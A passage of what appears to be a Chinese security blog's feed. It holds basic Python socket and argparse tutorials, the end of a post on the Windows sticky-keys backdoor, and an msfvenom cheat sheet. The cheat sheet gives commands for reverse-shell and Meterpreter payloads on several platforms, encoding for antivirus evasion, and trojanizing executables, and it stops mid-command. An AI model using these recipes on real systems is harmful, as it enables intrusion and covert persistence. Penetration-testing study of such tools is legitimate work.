:::</h2><blockquote><p>使用<code>shift</code>后门建议使用<code>win2003</code>去远程连接其他服务器，这样会有登录页面，也才能使用<code>shift</code>后门，其他版本的Windows可能会要你直接在本地输入账户和密码，也就不能使用shift后门</p></blockquote><div id="aplayer10" class="aplayer" style="margin-bottom: 20px;"></div><script>new APlayer({element: document.getElementById("aplayer10"),narrow: false,autoplay: true,showlrc: 0,music: {title: "六月的雨",author: "胡歌",url: "/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3",pic: "/Music/233.jpg",}});</script>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;我们都知道，windows系统按&lt;strong&gt;5&lt;/strong&gt;下&lt;strong&gt;shift&lt;/strong&gt;后，windows就执行了&lt;strong&gt;system32&lt;/strong&gt;下的&lt;strong&gt;sethc.exe&lt;/strong&gt;，也就是启用了粘滞键。虽然快捷方便，但却存在安全隐患。&lt;/p&gt;
    
    </summary>
    
    
      <category term="权限维持" scheme="https://damit5.com/tags/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
    
  </entry>
  
  <entry>
    <title>Python socket模块实现简易的通信</title>
    <link href="https://damit5.com/2017/09/30/Python-socket%E6%A8%A1%E5%9D%97%E5%AE%9E%E7%8E%B0%E7%AE%80%E6%98%93%E7%9A%84%E9%80%9A%E4%BF%A1/"/>
    <id>https://damit5.com/2017/09/30/Python-socket模块实现简易的通信/</id>
    <published>2017-09-30T06:00:16.000Z</published>
    <updated>2018-06-10T03:52:06.348Z</updated>
    
    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><div id="aplayer21" class="aplayer" style="margin-bottom: 20px;"></div><script>new APlayer({element: document.getElementById("aplayer21"),narrow: false,autoplay: true,showlrc: 0,music: {title: "六月的雨",author: "胡歌",url: "/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3",pic: "/Music/233.jpg",}});</script><h2 id="0×01-思路"><a href="#0×01-思路" class="headerlink" title="0×01 思路"></a>0×01 思路</h2><blockquote><p>编写一个脚本之前，我们都应该YY一下思路，这样写出来的东西才会质量高，速度快。</p></blockquote><a id="more"></a><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><blockquote><p>服务端</p><ul><li>1.创建一个socket的对象</li><li>2.绑定IP和端口</li><li>3.设置监听数量</li><li>4.开始监听</li><li>5.发送数据和接收数据</li></ul><p>客户端</p><ul><li>1.创建一个socket对象</li><li>2.连接IP和端口</li><li>3.发送数据和接收数据</li></ul></blockquote><h2 id="0×02-服务端"><a href="#0×02-服务端" class="headerlink" title="0×02 服务端"></a>0×02 服务端</h2><h4 id="1-创建一个socket的对象"><a href="#1-创建一个socket的对象" class="headerlink" title="1.创建一个socket的对象"></a>1.创建一个socket的对象</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ss = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</div></pre></td></tr></table></figure><h4 id="2-绑定IP和端口"><a href="#2-绑定IP和端口" class="headerlink" title="2.绑定IP和端口"></a>2.绑定IP和端口</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">host = &apos;127.0.0.1&apos;</div><div class="line">port = 4444</div><div class="line">#注意传入的是元组</div><div class="line">ss.bind((host,ip))</div></pre></td></tr></table></figure><h4 id="3-设置监听数量"><a href="#3-设置监听数量" class="headerlink" title="3.设置监听数量"></a>3.设置监听数量</h4><p><code>socket.listen(backlog)</code><br>监听到socket的连接。backlog参数指定排队连接的最大数量，并且应至少为0；最大值取决于系统（通常为5），最小值被强制为0。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ss.listen(1)</div></pre></td></tr></table></figure></p><h4 id="4-开始监听"><a href="#4-开始监听" class="headerlink" title="4.开始监听"></a>4.开始监听</h4><p><code>socket.accept()</code><br>接受连接。套接字必须绑定到一个地址并侦听连接。The return value is a pair (conn, address) where conn is a new socket object usable to send and receive data on the connection, and address is the address bound to the socket on the other end of the connection.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">s,addr = ss.accept()</div></pre></td></tr></table></figure></p><h4 id="5-接收数据"><a href="#5-接收数据" class="headerlink" title="5.接收数据"></a>5.接收数据</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">def rec():</div><div class="line">    while True:</div><div class="line">        data = s.recv(1024)</div><div class="line">        #防止无限的回车</div><div class="line">        if len(data) == 0:</div><div class="line">            continue</div><div class="line">        print data</div></pre></td></tr></table></figure><h4 id="6-发送数据"><a href="#6-发送数据" class="headerlink" title="6.发送数据"></a>6.发送数据</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">def sen():</div><div class="line">    while True:</div><div class="line">        content = raw_input()</div><div class="line">        if len(content) == 0:</div><div class="line">            continue</div><div class="line">        s.send(content)</div></pre></td></tr></table></figure><h2 id="0×03-客户端"><a href="#0×03-客户端" class="headerlink" title="0×03 客户端"></a>0×03 客户端</h2><h4 id="1-创建socket对象"><a href="#1-创建socket对象" class="headerlink" title="1.创建socket对象"></a>1.创建socket对象</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">c = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</div></pre></td></tr></table></figure><h4 id="2-连接服务器IP和端口"><a href="#2-连接服务器IP和端口" class="headerlink" title="2.连接服务器IP和端口"></a>2.连接服务器IP和端口</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># 注意传入的是元组</div><div class="line">c.connect((&apos;127.0.0.1&apos;,4444))</div></pre></td></tr></table></figure><h4 id="3-接收数据"><a href="#3-接收数据" class="headerlink" title="3.接收数据"></a>3.接收数据</h4><p>类似服务端</p><h4 id="4-发送数据"><a href="#4-发送数据" class="headerlink" title="4.发送数据"></a>4.发送数据</h4><p>类似服务端</p><h2 id="0×04-实例"><a href="#0×04-实例" class="headerlink" title="0×04 实例"></a>0×04 实例</h2><p><img src="//r.photo.store.qq.com/psb?/V12DlJ9S2zSi6P/aGZXBG*k7y8dPj*TeF1H*8z5b00mhLmRbtSZKztmQBA!/r/dCsAAAAAAAAA" alt="test"></p><h2 id="0×05-参考链接"><a href="#0×05-参考链接" class="headerlink" title="0×05 参考链接"></a>0×05 参考链接</h2><h3 id="socket官方文档"><a href="#socket官方文档" class="headerlink" title="socket官方文档"></a><a href="https://docs.python.org/2/library/socket.html?highlight=socket#module-socket" target="_blank" rel="external">socket官方文档</a></h3><h3 id="socket官方文档翻译"><a href="#socket官方文档翻译" class="headerlink" title="socket官方文档翻译"></a><a href="//python.usyiyi.cn/documents/python_278/library/socket.html">socket官方文档翻译</a></h3>]]></content>
    
    <summary type="html">
    
      &lt;div id=&quot;aplayer21&quot; class=&quot;aplayer&quot; style=&quot;margin-bottom: 20px;&quot;&gt;&lt;/div&gt;
		&lt;script&gt;
			new APlayer({
				element: document.getElementById(&quot;aplayer21&quot;),
				narrow: false,
				autoplay: true,
				showlrc: 0,
				music: {
					title: &quot;六月的雨&quot;,
					author: &quot;胡歌&quot;,
					url: &quot;/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3&quot;,
					pic: &quot;/Music/233.jpg&quot;,
				}
			});
		&lt;/script&gt;
&lt;h2 id=&quot;0×01-思路&quot;&gt;&lt;a href=&quot;#0×01-思路&quot; class=&quot;headerlink&quot; title=&quot;0×01 思路&quot;&gt;&lt;/a&gt;0×01 思路&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;编写一个脚本之前，我们都应该YY一下思路，这样写出来的东西才会质量高，速度快。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="Python" scheme="https://damit5.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Python argparse 模块的简易使用</title>
    <link href="https://damit5.com/2017/09/30/Python-argparse-%E6%A8%A1%E5%9D%97%E7%9A%84%E7%AE%80%E6%98%93%E4%BD%BF%E7%94%A8/"/>
    <id>https://damit5.com/2017/09/30/Python-argparse-模块的简易使用/</id>
    <published>2017-09-30T05:56:49.000Z</published>
    <updated>2018-06-10T03:51:39.878Z</updated>
    
    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><div id="aplayer22" class="aplayer" style="margin-bottom: 20px;"></div><script>new APlayer({element: document.getElementById("aplayer22"),narrow: false,autoplay: true,showlrc: 0,music: {title: "六月的雨",author: "胡歌",url: "/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3",pic: "/Music/233.jpg",}});</script><a id="more"></a><h2 id="0×00-示例"><a href="#0×00-示例" class="headerlink" title="0×00 示例"></a>0×00 示例</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">#-*-coding:UTF-8-*-</div><div class="line">import argparse</div><div class="line"></div><div class="line">parse = argparse.ArgumentParser(description=&apos;this is the start show message&apos;,</div><div class="line">                                epilog=&apos;this is the stop show message&apos;)</div><div class="line"></div><div class="line">#不注释掉的话就必须传入一个参数，导致 --author 选项不带参数使用会报错</div><div class="line">&apos;&apos;&apos;parse.add_argument(dest=&apos;test&apos;,nargs=&apos;+&apos;,metavar=&apos;test&apos;,</div><div class="line">                   help=&apos;this is test&apos;)&apos;&apos;&apos;</div><div class="line"></div><div class="line">parse.add_argument(&apos;-p&apos;,&apos;--port&apos;,dest=&apos;port&apos;,metavar=&apos;tgt_port&apos;,</div><div class="line">                   help=r&quot;enter the target&apos;s port&quot;)</div><div class="line"></div><div class="line">parse.add_argument(&apos;-H&apos;,&apos;--host&apos;,dest=&apos;host&apos;,</div><div class="line">                   help=r&quot;enter the target&apos;s host&quot;)</div><div class="line"></div><div class="line">parse.add_argument(&apos;--author&apos;,dest=&apos;author&apos;,action=&apos;store_true&apos;,</div><div class="line">                   help=&apos;show author&apos;)</div><div class="line"></div><div class="line">args = parse.parse_args()</div><div class="line">print &apos;port: &apos; + str(args.port)</div><div class="line">print &apos;host: &apos; + str(args.host)</div><div class="line">if args.author:</div><div class="line">    print &apos;author is damit5&apos;</div></pre></td></tr></table></figure><ul><li>将上述内容保存为<code>temp.py</code></li></ul><h4 id="运行python-temp-py-h"><a href="#运行python-temp-py-h" class="headerlink" title="运行python temp.py -h"></a>运行<code>python temp.py -h</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">usage: temp.py [-h] [-p tgt_port] [-H HOST] [--author]</div><div class="line"></div><div class="line">this is the start show message</div><div class="line"></div><div class="line">optional arguments:</div><div class="line">  -h, --help            show this help message and exit</div><div class="line">  -p tgt_port, --port tgt_port</div><div class="line">                        enter the target&apos;s port</div><div class="line">  -H HOST, --host HOST  enter the target&apos;s host</div><div class="line">  --author              show author</div><div class="line"></div><div class="line">this is the stop show message</div></pre></td></tr></table></figure><h4 id="运行python-temp-py-p-123-H-1-1-1-1"><a href="#运行python-temp-py-p-123-H-1-1-1-1" class="headerlink" title="运行python temp.py -p 123 -H 1.1.1.1"></a>运行<code>python temp.py -p 123 -H 1.1.1.1</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">port: 123</div><div class="line">host: 1.1.1.1</div></pre></td></tr></table></figure><h4 id="运行python-temp-py-author"><a href="#运行python-temp-py-author" class="headerlink" title="运行python temp.py --author"></a>运行<code>python temp.py --author</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">port: None</div><div class="line">host: None</div><div class="line">author is damit5</div></pre></td></tr></table></figure><h2 id="0×01-编写过程"><a href="#0×01-编写过程" class="headerlink" title="0×01 编写过程"></a>0×01 编写过程</h2><h4 id="1-创建一个解析器"><a href="#1-创建一个解析器" class="headerlink" title="1.创建一个解析器"></a>1.创建一个解析器</h4><p>使用<code>argparse</code>的第一步是创建一个<code>ArgumentParser</code>对象</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">import argparse</div><div class="line"></div><div class="line">argparse.ArgumentParser()</div></pre></td></tr></table></figure><p><code>ArgumentParser</code>对象会保存把命令行解析成Python数据类型所需要的所有信息。</p><h4 id="2-添加参数"><a href="#2-添加参数" class="headerlink" title="2.添加参数"></a>2.添加参数</h4><p>通过调用<code>add_argument()</code>方法向<code>ArgumentParser</code>添加程序的参数信息。通常情况下，这些信息告诉ArgumentParser如何接收命令行上的字符串并将它们转换成对象。这些信息被保存下来并在调用parse_args()时用到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">parse.add_argument(&apos;-p&apos;,&apos;--port&apos;,dest=&apos;port&apos;,metavar=&apos;tgt_port&apos;,</div><div class="line">                   help=r&quot;enter the target&apos;s port&quot;)</div><div class="line"></div><div class="line">parse.add_argument(&apos;-H&apos;,&apos;--host&apos;,dest=&apos;host&apos;,</div><div class="line">                   help=r&quot;enter the target&apos;s host&quot;)</div><div class="line"></div><div class="line">parse.add_argument(&apos;--author&apos;,dest=&apos;author&apos;,action=&apos;store_true&apos;,</div><div class="line">                   help=&apos;show author&apos;)</div></pre></td></tr></table></figure></p><p>首先输入指令的名字，比如<code>-p</code>、<code>-H</code>,如果指令没有名字，那么终端输入时没带指令的参数将自动保存在当前属性中</p><p><code>dest</code>是属性，传入进来的参数就是属性所对应的值；</p><p><code>metavar</code>相当于在 <code>-h</code> 中显示出来值，如果没有就默认使用<code>dest</code></p><p><code>help</code>就用来输出帮助说明</p><h4 id="3-解析参数"><a href="#3-解析参数" class="headerlink" title="3.解析参数"></a>3.解析参数</h4><p><code>ArgumentParser</code>通过<code>parse_args()</code>方法解析参数。它将检查命令行，把每个参数转换成恰当的类型并采取恰当的动作。在大部分情况下，这意味着将从命令行中解析出来的属性建立一个简单的 Namespace对象。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">args = parse.parse_args()</div></pre></td></tr></table></figure></p><p>在脚本中，<code>parse_args()</code>调用一般不带参数，<code>ArgumentParser</code> 将根据<code>sys.argv</code>自动确定命令行参数。</p><h2 id="0×02-ArgumentParser-对象"><a href="#0×02-ArgumentParser-对象" class="headerlink" title="0×02 ArgumentParser 对象"></a>0×02 ArgumentParser 对象</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">argparse.ArgumentParser(prog=None, usage=None, description=None, epilog=None, parents=[], formatter_class=argparse.HelpFormatter, prefix_chars=&apos;-&apos;, fromfile_prefix_chars=None, argument_default=None, conflict_handler=&apos;error&apos;, add_help=True)</div></pre></td></tr></table></figure><p>创建一个新的<code>ArgumentParser</code>对象。所有的参数应该以关键字参数传递。下面有对每个参数各自详细的描述，但是简短地讲它们是</p><ul><li>prog - 程序的名字（默认：sys.argv[0]）</li><li>usage - 描述程序用法的字符串（默认：从解析器的参数生成）</li><li>description - 参数帮助信息之前的文本（默认：空）</li><li>epilog - 参数帮助信息之后的文本（默认：空）</li><li>parents - ArgumentParser 对象的一个列表，这些对象的参数应该包括进去</li><li>formatter_class - 定制化帮助信息的类</li><li>prefix_chars - 可选参数的前缀字符集（默认：‘-‘）</li><li>fromfile_prefix_chars - 额外的参数应该读取的文件的前缀字符集（默认：None）</li><li>argument_default - 参数的全局默认值（默认：None）</li><li>conflict_handler - 解决冲突的可选参数的策略（通常没有必要）</li><li>add_help - 给解析器添加-h/–help 选项（默认：True）</li></ul><h4 id="参数详细解释点我"><a href="#参数详细解释点我" class="headerlink" title="参数详细解释点我"></a><a href="https://docs.python.org/2/library/argparse.html#argumentparser-objects" target="_blank" rel="external">参数详细解释点我</a></h4><h2 id="0×03-add-argument-方法"><a href="#0×03-add-argument-方法" class="headerlink" title="0×03 add_argument()方法"></a>0×03 add_argument()方法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ArgumentParser.add_argument(name or flags...[, action][, nargs][, const][, default][, type][, choices][, required][, help][, metavar][, dest])</div></pre></td></tr></table></figure><p>定义应该如何解析一个命令行参数。下面每个参数有它们自己详细的描述，简单地讲它们是：</p><ul><li>name or flags - 选项字符串的名字或者列表，例如foo 或者-f, –foo。</li><li>action - 在命令行遇到该参数时采取的基本动作类型。</li><li>nargs - 应该读取的命令行参数数目。</li><li>const - 某些action和nargs选项要求的常数值。</li><li>default - 如果命令行中没有出现该参数时的默认值。</li><li>type - 命令行参数应该被转换成的类型。</li><li>choices - 参数可允许的值的一个容器。</li><li>required - 该命令行选项是否可以省略（只针对可选参数）。</li><li>help - 参数的简短描述。</li><li>metavar - 参数在帮助信息中的名字。</li><li>dest - 给parse_args()返回的对象要添加的属性名称。</li></ul><h4 id="参数详细解释点我-1"><a href="#参数详细解释点我-1" class="headerlink" title="参数详细解释点我"></a><a href="https://docs.python.org/2/library/argparse.html#the-add-argument-method" target="_blank" rel="external">参数详细解释点我</a></h4><h2 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h2><h4 id="官方文档"><a href="#官方文档" class="headerlink" title="官方文档"></a><a href="https://docs.python.org/2/library/argparse.html" target="_blank" rel="external">官方文档</a></h4><h4 id="官方文档翻译"><a href="#官方文档翻译" class="headerlink" title="官方文档翻译"></a><a href="//python.usyiyi.cn/documents/python_278/library/argparse.html">官方文档翻译</a></h4>]]></content>
    
    <summary type="html">
    
      &lt;div id=&quot;aplayer22&quot; class=&quot;aplayer&quot; style=&quot;margin-bottom: 20px;&quot;&gt;&lt;/div&gt;
		&lt;script&gt;
			new APlayer({
				element: document.getElementById(&quot;aplayer22&quot;),
				narrow: false,
				autoplay: true,
				showlrc: 0,
				music: {
					title: &quot;六月的雨&quot;,
					author: &quot;胡歌&quot;,
					url: &quot;/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3&quot;,
					pic: &quot;/Music/233.jpg&quot;,
				}
			});
		&lt;/script&gt;
    
    </summary>
    
    
      <category term="Python" scheme="https://damit5.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>MSFvenom使用总结</title>
    <link href="https://damit5.com/2017/09/30/MSFvenom%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/"/>
    <id>https://damit5.com/2017/09/30/MSFvenom使用总结/</id>
    <published>2017-09-30T05:54:43.000Z</published>
    <updated>2018-06-10T03:47:53.147Z</updated>
    
    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><div id="aplayer2" class="aplayer" style="margin-bottom: 20px;"></div><script>new APlayer({element: document.getElementById("aplayer2"),narrow: false,autoplay: true,showlrc: 0,music: {title: "六月的雨",author: "胡歌",url: "/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3",pic: "/Music/233.jpg",}});</script><a id="more"></a><h2 id="0×00-参数介绍"><a href="#0×00-参数介绍" class="headerlink" title="0×00 参数介绍"></a>0×00 参数介绍</h2><p>Msfvenom是有效载荷生成和编码的组合，它于2015年6月8日取代了msfpayload和msfencode</p><p>再开始使用msfvenom前，请先看看它支持的选项：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -h</div></pre></td></tr></table></figure><p><img src="//damit5.ml/usr/uploads/BLOG/msfvenom/msfvenom.png" alt="msfvenom"></p><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">-p, --payload           #添加载荷payload</div><div class="line">    --payload-options   #列出payload选项</div></pre></td></tr></table></figure><p>载荷这个东西比较多，这个软件就是根据对应的载荷payload生成对应平台下的后门，所以只有选对payload，再填写正确自己的IP，PORT就可以生成对应语言，对应平台的后门了</p><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">-l, --list              #查看所有payload、encoder、nops</div></pre></td></tr></table></figure><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">-f, --format            #输出文件的格式</div><div class="line">    --help-formats      #列出所有文件格式</div></pre></td></tr></table></figure><h4 id="可执行的格式-Executable-formats"><a href="#可执行的格式-Executable-formats" class="headerlink" title="可执行的格式 ( Executable formats )"></a>可执行的格式 ( Executable formats )</h4><p>asp, aspx, aspx-exe, axis2, dll, elf, elf-so, exe, exe-only, exe-service, exe-small, hta-psh, jar, loop-vbs, macho, msi, msi-nouac, osx-app, psh, psh-net, psh-reflection, psh-cmd, vba, vba-exe, vba-psh, vbs, war</p><h4 id="需要变换的格式-Transform-formats"><a href="#需要变换的格式-Transform-formats" class="headerlink" title="需要变换的格式: ( Transform formats )"></a>需要变换的格式: ( Transform formats )</h4><p>bash, c, csharp, dw, dword, hex, java, js_be, js_le, num, perl, pl, powershell, ps1, py, python, raw, rb, ruby, sh, vbapplication, vbscript</p><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">-e, --encoder           #编码免杀</div></pre></td></tr></table></figure><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">-a, --arch             #选择架构</div><div class="line">    --platform         #选择平台</div><div class="line">    --help-platforms   #列出可选择的平台</div></pre></td></tr></table></figure><h4 id="选择架构平台"><a href="#选择架构平台" class="headerlink" title="选择架构平台"></a>选择架构平台</h4><p>x86 | x64 | x86_64</p><h4 id="Platforms"><a href="#Platforms" class="headerlink" title="Platforms:"></a>Platforms:</h4><p>windows, netware, android, java, ruby, linux, cisco, solaris, osx, bsd, openbsd, bsdi, netbsd, freebsd, aix, hpux, irix, unix, php, javascript, python, nodejs, firefox, mainframe</p><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">-s, --space             #生成payload的最大长度，就是文件大小</div><div class="line">    --encoder-space     #生成编码payload的最大长度</div></pre></td></tr></table></figure><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">-b, --bad-chars         #避免使用的字符 例如：不使用 &apos;\x00&apos;</div></pre></td></tr></table></figure><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">-i, --iterations        #编码次数</div></pre></td></tr></table></figure><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">c, --add-code           #添加自己的shellcode</div></pre></td></tr></table></figure><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">-o, --out               #文件输出</div></pre></td></tr></table></figure><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">-x | -k                 #将后门捆绑到程序上</div></pre></td></tr></table></figure><h2 id="0×01-Msfvenom实例"><a href="#0×01-Msfvenom实例" class="headerlink" title="0×01 Msfvenom实例"></a>0×01 Msfvenom实例</h2><h4 id="普通生成"><a href="#普通生成" class="headerlink" title="普通生成"></a>普通生成</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">msfvenom -p &lt;payload&gt; &lt;payload options&gt; -f &lt;format&gt; -o &lt;path&gt;</div><div class="line"></div><div class="line">msfvenom -p windows/meterpreter/reverse_tcp -f exe -o /root/shell.exe</div></pre></td></tr></table></figure><h4 id="编码处理型"><a href="#编码处理型" class="headerlink" title="编码处理型"></a>编码处理型</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">msfvenom -p &lt;payload&gt; -e &lt;encoder &gt; -i &lt;encoder times&gt;  -n &lt;nopsled&gt; -f &lt;format&gt; -o &lt;path&gt;</div><div class="line"></div><div class="line">msfvenom -p windows/meterpreter/reverse_tcp -i 3 -e x86/shikata_ga_nai -f exe -o /root/shell.exe</div></pre></td></tr></table></figure><h4 id="捆绑"><a href="#捆绑" class="headerlink" title="捆绑"></a>捆绑</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -x /root/test.exe -k -f exe -o /root/shell.exe</div></pre></td></tr></table></figure><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">msfvenom --platform windows -a x86 -p windows/meterpreter/reverse_tcp -i 3 -e x86/shikata_ga_nai -f exe -o /root/shell.exe</div><div class="line"></div><div class="line">Msfvenom -platform windows -a x86 -p windows/x64/meterpreter/reverse_tcp -f exe -o /root/shell.exe</div></pre></td></tr></table></figure><h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</div></pre></td></tr></table></figure><h4 id="MAC"><a href="#MAC" class="headerlink" title="MAC"></a>MAC</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</div></pre></td></tr></table></figure><h4 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</div></pre></td></tr></table></figure><h4 id="Asp"><a href="#Asp" class="headerlink" title="Asp"></a>Asp</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</div></pre></td></tr></table></figure><h4 id="Aspx"><a href="#Aspx" class="headerlink" title="Aspx"></a>Aspx</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f aspx &gt; shell.aspx</div></pre></td></tr></table></figure><h4 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</div></pre></td></tr></table></figure><h4 id="War"><a href="#War" class="headerlink" title="War"></a>War</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</div></pre></td></tr></table></figure><h4 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p cmd/unix/reverse_bash 